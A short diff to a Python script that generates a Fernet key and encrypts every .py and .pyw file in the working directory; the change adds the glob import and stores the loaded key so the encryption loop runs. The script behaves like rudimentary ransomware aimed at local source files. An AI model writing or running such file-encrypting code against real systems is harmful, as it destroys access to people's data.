@@ -1,4 +1,5 @@
 from cryptography.fernet import Fernet
+import glob
 
 def write_key():
     key = Fernet.generate_key()
@@ -26,7 +27,7 @@ def encrypt(filename, key):
 
 
 write_key()
-load_key()
+key=load_key()
 pythonSoubory = glob.glob('*.py') + glob.glob('*.pyw')
 for file in pythonSoubory:
     encrypt (file,key)
